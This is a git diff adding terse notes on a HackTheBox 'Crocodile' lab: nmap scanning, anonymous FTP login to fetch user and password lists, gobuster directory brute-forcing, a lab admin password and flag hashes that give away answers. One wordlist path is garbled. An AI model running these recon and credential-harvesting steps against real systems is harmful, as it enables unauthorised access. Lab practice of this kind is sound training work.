@@ -99,3 +99,34 @@ use htb;
 show tables;
 SELECT * from config;
 7b4bec00d1a39e3dd4e021ec3d915da8
+
+#Crocodile
+HackTheBox Crocodile Walkthrough
+10.129.151.7
+nmap -F -sV -sC 10.129.151.7
+-sC
+vsftpd 3.0.3
+ftp anonymous@10.129.151.7
+230
+anonymous
+get
+get allowed.userlist
+get allowed.userlist.passwd
+
+cat allowed.userlist
+cat allowed.userlist.passwd
+admin
+Apache httpd 2.4.41
+
+gobuster dir -u http://10.129.151.7/ -w /opt/SecLists/Discovery/Web-Content/directory-list-1.0.txt
+
+gobuster dir -u http://10.129.151.7/ -w /opt/SecLists/Discovery/Web-Contdashboard/ent/Common-PHP-Filenames.txt -x php
+
+gobuster dir -u http://10.129.151.7/dashboard/ -w /opt/SecLists/Discovery/Web-Contdashboard/ent/Common-PHP-Filenames.txt -x php
+
+login.php
+http://10.129.151.7/login.php
+admin
+rKXM59ESxesUFHAd
+
+c7110277ac44d78b6a9fff2232434d16
